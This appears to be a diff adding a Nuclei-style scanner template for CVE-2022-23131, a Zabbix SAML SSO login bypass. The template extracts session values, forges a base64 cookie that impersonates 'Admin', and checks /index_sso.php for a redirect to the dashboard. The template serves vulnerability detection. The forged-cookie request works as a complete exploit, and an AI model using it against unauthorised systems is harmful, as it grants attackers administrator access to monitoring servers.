@@ -1,0 +1,56 @@
+id: zabbix-index-sso-login-bypass
+info:
+  name: Zabbix index_sso.php Login Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Zabbix has a login bypass vulnerability when SAML SSO authentication is enabled. This allows unauthenticated attackers to escalate privileges and gain administrator access.
+  reference:
+    - https://support.zabbix.com/browse/ZBX-20350
+    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202201-1030
+  classification:
+    cvss-score: 7.0
+    cve-id: CVE-2022-23131
+    cwe-id: CWE-287
+variables:
+  zbx_cookie: |
+    {{base64(concat('{"saml_data": {"username_attribute": "Admin"}, "sessionid":"', extract("sessionid"), '","sign":"', extract("sign"), '"}'))}}
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    extractors:
+      - type: regex
+        name: sessionid
+        part: header
+        internal: true
+        regex:
+          - '"sessionid":"(.*?)",'
+      - type: regex
+        name: sign
+        part: header
+        internal: true
+        regex:
+          - '"sign":"(.*?)"}'
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - 'zbx_session=(.*?);'
+  - raw:
+      - |
+        GET /index_sso.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: zbx_session={{zbx_cookie}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - 'zabbix.php?action=dashboard.view'
